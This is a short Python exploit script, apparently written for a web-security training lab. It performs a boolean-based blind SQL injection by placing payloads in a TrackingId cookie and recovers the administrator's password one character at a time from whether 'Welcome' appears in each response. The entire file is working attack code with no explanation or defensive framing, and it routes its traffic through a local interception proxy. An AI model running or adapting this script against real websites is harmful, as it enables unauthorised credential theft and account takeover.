import requests
import urllib
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}


def sql_passwd(url):
	passwd_extracted = ''
	for i in range (1, 21):
		for j in range(32, 126):
			sql_payload = f"' and (select ascii(substring(password,{i},1)) from users where username='administrator')='{j}'--"
			sql_payload_encoded = urllib.parse.quote(sql_payload)
			cookie = {'TrackingId':'LqGZSknD9juMta4z'+sql_payload_encoded,'session':'UE1kvU7x5oc9YeyayvMyohfNP2MCBoIn'}
			r = requests.get(url, cookies=cookie, verify=False, proxies=proxies)
			if "Welcome" not in r.text:
				sys.stdout.write('\r'+passwd_extracted+chr(j))
				sys.stdout.flush()
			else:
				passwd_extracted += chr(j)
				sys.stdout.write('\r'+passwd_extracted)
				sys.stdout.flush()
				break


def main():
	if len(sys.argv) != 2:
		print(f'[!] Usage: {sys.argv[0]} <url>')
		print(f'[!] Example: {sys.argv[0]} webapp.com')
	url = sys.argv[1]
	print('[*] Retrieving password...')
	sql_passwd(url)


if __name__ == '__main__':
	main()